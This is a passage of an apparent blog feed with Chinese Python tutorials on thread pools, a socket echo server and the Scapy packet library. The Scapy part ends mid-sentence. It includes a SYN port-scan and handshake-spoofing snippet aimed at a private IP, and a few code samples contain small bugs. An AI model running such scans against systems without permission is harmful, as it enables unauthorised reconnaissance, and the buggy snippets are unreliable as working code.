    <link href="http://www.xpshuai.cn/python-%E8%87%AA%E5%B8%A6%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B1%A0/"/>
    <id>http://www.xpshuai.cn/python-自带的线程池和进程池/</id>
    <published>2020-02-24T03:12:07.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from multiprocessing import Pool   # 进程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool  <span class="comment">#线程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool <span class="comment"># 线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125;-------555"</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_back</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    print(<span class="string">"处理数据完成"</span>,args, kwargs)</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">6</span>)   <span class="comment"># 不写的话 默认是cpu的个数</span></span><br><span class="line"><span class="comment"># print(threading.active_count())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    pool.apply_async(func=func, args=(i,), callback=print_back)  <span class="comment">## 添加任务   不阻塞    主要使用的方法</span></span><br><span class="line"><span class="comment">#     pool.apply(func=func, )  ## 添加任务   阻塞</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pool.map(func, [i for i in range(5)])   #添加任务  不阻塞</span></span><br><span class="line"></span><br><span class="line">pool.close()   <span class="comment">#关闭线程池  不在提交新的任务</span></span><br><span class="line">pool.join()    <span class="comment">#等待进程池中的任务执行完毕</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"任务结束"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########### 线程池的步骤</span></span><br><span class="line">p = ThreadPool(<span class="number">3</span>) <span class="comment"># 实例化</span></span><br><span class="line">p.apply_async(func) <span class="comment"># 函数      # 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">p.close()</span><br><span class="line">p.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程池比线程池耗费资源</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">async_result = p.apply_async(func) <span class="comment"># 函数</span></span><br><span class="line">print(async_result.get())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="线程池" scheme="http://www.xpshuai.cn/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>python-线程池并发服务器</title>
    <link href="http://www.xpshuai.cn/python-%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://www.xpshuai.cn/python-线程池并发服务器/</id>
    <published>2020-02-24T03:11:44.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>server</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 使用线程池来实现并发服务器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">(conn)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_data = conn.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span>  <span class="keyword">not</span> recv_data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"客户端&#123;&#125;发送了&#123;&#125;"</span>.format(conn, recv_data.decode()))</span><br><span class="line">        conn.send(recv_data)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">    server.listen(<span class="number">1000</span>)</span><br><span class="line">    pool = Pool(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = server.accept()</span><br><span class="line">        print(<span class="string">"客户端&#123;&#125;连接成功"</span>.format(addr))</span><br><span class="line">        pool.apply_async(func=worker, args=(conn,))</span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = socket.socket()</span><br><span class="line"></span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = input(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    <span class="keyword">if</span> msg:</span><br><span class="line">        c.send(msg.encode())   <span class="comment"># 只能发送 bytes 类型的数据   encode将中文的变成byte的</span></span><br><span class="line">        print(c.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;server&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="线程池" scheme="http://www.xpshuai.cn/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>python-简单的线程池的实现</title>
    <link href="http://www.xpshuai.cn/python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.xpshuai.cn/python-简单的线程池的实现/</id>
    <published>2020-02-24T03:10:53.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多进程服务器   创建 销毁</span></span><br><span class="line"><span class="comment"># 通过提前创建好线程  当任务来了 就分配线程去执行</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">主线程： 相当于生产者，只管向线程池提交任务。</span></span><br><span class="line"><span class="string">               并不关心线程池是如何执行任务的。</span></span><br><span class="line"><span class="string">               因此，并不关心是哪一个线程执行的这个任务。</span></span><br><span class="line"><span class="string">线程池： 相当于消费者，负责接收任务，</span></span><br><span class="line"><span class="string">               并将任务分配到一个空闲的线程中去执行。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n)</span>:</span>  <span class="comment"># 意味着传啦几次</span></span><br><span class="line">        self.queue = Queue()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>):   <span class="comment"># 每个线程都去执行类里面的func方法</span></span><br><span class="line">            Thread(target=self.work, args=(self.queue, ), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            func, args, kwargs = self.queue.get()</span><br><span class="line">            func(*args, **kwargs)</span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">apply_async</span><span class="params">(self, func, args=<span class="params">()</span>, kwargs=&#123;&#125;)</span>:</span>   <span class="comment"># 主线程调用的</span></span><br><span class="line">        self.queue.put((func, args, kwargs))   <span class="comment"># 扔到队列里面</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">join</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.queue.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task1</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"111"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task2</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"222222"</span>)</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">2</span>)</span><br><span class="line">pool.apply_async(task1)</span><br><span class="line">pool.apply_async(task2)</span><br><span class="line">print(<span class="string">"任务提交完成"</span>)</span><br><span class="line">pool.join()</span><br><span class="line">print(<span class="string">"任务完成"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="线程池" scheme="http://www.xpshuai.cn/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>python-可重复利用的线程</title>
    <link href="http://www.xpshuai.cn/python-%E5%8F%AF%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E7%9A%84%E7%BA%BF%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-可重复利用的线程/</id>
    <published>2020-02-24T03:10:38.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.queue = queue.Queue()</span><br><span class="line">        self.daemon = <span class="literal">True</span>  <span class="comment"># 守护进程</span></span><br><span class="line">        self.start()   <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>   <span class="comment"># 只有run里的才是子线程执行的</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            func, args, kwargs = self.queue.get()  <span class="comment"># 从队列当中获取任务</span></span><br><span class="line">            func(*args, **kwargs)</span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">apply_async</span><span class="params">(self, func, args=<span class="params">()</span>, kwargs=&#123;&#125;)</span>:</span></span><br><span class="line">        self.queue.put((func, args, kwargs))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">join</span><span class="params">(self, timeout=None)</span>:</span>    <span class="comment"># 等待所有提交的任务执行完毕</span></span><br><span class="line">        self.queue.join()        <span class="comment"># 解阻塞</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_one</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'111111111'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_two</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'222222222222'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t = MyThread()</span><br><span class="line">    t.apply_async(print_one)</span><br><span class="line">    t.apply_async(print_two, args=(<span class="number">1</span>,<span class="number">2</span>), kwargs=&#123;<span class="string">"a"</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    t.join()   <span class="comment"># 线程的join   等待队列结束</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="线程池" scheme="http://www.xpshuai.cn/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
  </entry>
  
  <entry>
    <title>Python之Scapy</title>
    <link href="http://www.xpshuai.cn/Python%E4%B9%8BScapy/"/>
    <id>http://www.xpshuai.cn/Python之Scapy/</id>
    <published>2020-02-23T10:02:28.000Z</published>
    <updated>2020-02-23T11:56:42.000Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。</p><p>换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。Scapy主要做两件事：发送数据包和接收答案。</p><p> 在python中可以通过scapy这个库轻松实现构造数据包、发送数据包、分析数据包，为网络编程之利器！</p><p>项目地址：<a href="https://github.com/secdev/scapy" target="_blank" rel="noopener">https://github.com/secdev/scapy</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Scapy 有两种使用方式：</p><ol><li><p>直接在shell中使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先下载项目到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:secdev/scapy.git</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./run_scapy</span><br><span class="line"><span class="comment"># 交互式使用</span></span><br></pre></td></tr></table></figure></li><li><p>作为Python的第三方库使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip3 install scapy</span><br><span class="line"><span class="comment"># 导入</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h6 id="构造数据包"><a href="#构造数据包" class="headerlink" title="构造数据包"></a>构造数据包</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.构造数据包     IP()创建一个默认数据包</span></span><br><span class="line"><span class="comment">#  ls(IP()) 可以查看IP数据包可以有哪些参数。</span></span><br><span class="line"><span class="comment"># 其他数据包同理： TCP(),</span></span><br><span class="line"></span><br><span class="line">pkt = IP(dst=<span class="string">"114.114.114.114"</span>)</span><br><span class="line"></span><br><span class="line">pkt.show()  <span class="comment"># 查看数据包信息</span></span><br><span class="line"></span><br><span class="line">pkt.summary()   <span class="comment"># 方法查看概要信息</span></span><br><span class="line"></span><br><span class="line">hexdump(pkt)    <span class="comment">#  查看数据包的字节信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 '/' 操作符来给数据包加上一层</span></span><br><span class="line"><span class="comment"># 例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。</span></span><br><span class="line">tcpkt = IP(dst=<span class="string">"114.114.114.114"</span>)/TCP()</span><br><span class="line">tcpkt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据包的目标端口可以用范围来表示，发送的时候就会发送dport 不同的多个数据包</span></span><br><span class="line">tcpkt = IP(dst=<span class="string">"114.114.114.114"</span>)/TCP(dport=(<span class="number">22</span>,<span class="number">33</span>))</span><br><span class="line"><span class="comment">#  如果设置了多个参数为范围的，最后发送的数据包就是笛卡尔积。</span></span><br><span class="line">tcpkt = IP(dst=<span class="string">"114.114.114.114"</span>)/TCP(dport=(<span class="number">22</span>,<span class="number">33</span>), sport=(<span class="number">4567</span>, <span class="number">4568</span>))</span><br><span class="line"><span class="keyword">for</span> tcp <span class="keyword">in</span> tcpkt:</span><br><span class="line">    print(tcp.dport, tcp.sport)</span><br></pre></td></tr></table></figure><h6 id="发送数据包-可能需要管理员权限"><a href="#发送数据包-可能需要管理员权限" class="headerlink" title="发送数据包 (可能需要管理员权限)"></a>发送数据包 (可能需要管理员权限)</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.发送数据包</span></span><br><span class="line"><span class="comment"># 发送数据包可能需要管理员权限，使用sudo python3 进入python即可。</span></span><br><span class="line"><span class="comment">## scapy发送数据包有常用的如下几种方法：</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">send(pkt)  发送三层数据包，但不会受到返回的结果(发完就拉倒)。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sr(pkt)  发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sr1(pkt)  发送三层数据包，仅仅返回接收到响应的数据包。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sendp(pkt)  发送二层数据包。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">srp(pkt)  发送二层数据包，并等待响应。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">srp1(pkt)  发送第二层数据包，并返回响应的数据包</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line">ans, uans = sr(pkt)</span><br><span class="line">print(ans)</span><br><span class="line">print(uans)</span><br></pre></td></tr></table></figure><h6 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 4.应用</span></span><br><span class="line"><span class="comment"># 1）可以构造数据包来实现一个简单的 SYN端口扫描 ，flags="S" 表示发送SYN数据包</span></span><br><span class="line">port_scan = IP(dst=<span class="string">"192.168.0.121"</span>)/TCP(dport=[22,80,135,443,3306,3389], flags=<span class="string">"S"</span>)</span><br><span class="line">ans, uans = sr(port_scan)</span><br><span class="line">ans.summary()</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">端口返回的flag位为 SA，表示这些端口是开放的。</span></span><br><span class="line"><span class="string">而 RA 表示reset ack， 说明这些端口是关闭的。</span></span><br><span class="line"><span class="string">【见下面图片】</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  2）实现一个基于TCP的traceroute</span></span><br><span class="line">ans, uans = sr(IP(dst=<span class="string">"114.114.114.114"</span>, ttl=(1,20), id=RandShort())/TCP(flags=<span class="string">"0x2"</span>))</span><br><span class="line"><span class="keyword">for</span> snd, rcv <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="built_in">print</span>(snd.ttl, rcv.src, isinstance((rcv.payload, TCP))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  3) 模拟TCP的三次握手</span></span><br><span class="line"><span class="built_in">source</span> = IP(dst=<span class="string">"192.168.0.121"</span>)/TCP(dport=22)</span><br><span class="line">rsp = sr1(<span class="built_in">source</span>)</span><br><span class="line">source2 = IP(dst=<span class="string">"192.168.0.121"</span>)/TCP(dport=22, flags=<span class="string">"A"</span>, seq=rsp.ack, ack=rsp.seq+1)</span><br><span class="line">rsp2 = sr1(source2)</span><br><span class="line"><span class="built_in">print</span>(rsp2.show())</span><br></pre></td></tr></table></figure><p><img src="/Python之Scapy/port_scan.png"></p><h6 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 5.其他</span></span><br><span class="line"><span class="comment"># scapy 还可以用来读取网络流量包或监听网卡流量。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">1. 使用函数 rdpcap("/abc/def/xxxx.pcap")  可以读取包的内容，</span></span><br><span class="line"><span class="string">2. 再使用  haslayer(TCP)  或  haslayer(ICMP)  等等来判断数据包的类型。</span></span><br><span class="line"><span class="string">3. 使用  sniff(iface="who1",count=100,filter="tcp xxxx")  可以监听网卡流量，iface声明监听的网卡，filter是过滤条件，count是符合过滤条件的数据包的个数，达到指定的数据包个数后会停止监听，不设count则没有限制，按ctrl-c 